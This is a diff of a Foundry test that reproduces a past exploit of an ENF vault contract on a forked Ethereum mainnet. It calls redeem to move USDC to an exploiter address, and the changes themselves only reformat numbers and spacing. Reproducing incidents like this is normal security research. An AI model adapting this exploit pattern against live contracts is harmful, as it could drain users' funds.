@@ -11,7 +11,7 @@ import "./interface.sol";
 // @TX
 // https://etherscan.io/tx/0x1fe5a53405d00ce2f3e15b214c7486c69cbc5bf165cf9596e86f797f62e81914
 
-interface IENF is IERC20{
+interface IENF is IERC20 {
     function redeem(uint256 shares, address receiver) external;
 }
 
@@ -23,13 +23,13 @@ contract ContractTest is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 16696239);
+        cheats.createSelectFork("mainnet", 16_696_239);
     }
 
     function testExploit() external {
         deal(address(ENF), address(this), 1e18);
         cheats.startPrank(address(this), address(this));
-        ENF.redeem(676562, exploiter);
+        ENF.redeem(676_562, exploiter);
         cheats.stopPrank();
 
         emit log_named_decimal_uint("Exploiter USDC balance after exploit", USDC.balanceOf(exploiter), USDC.decimals());
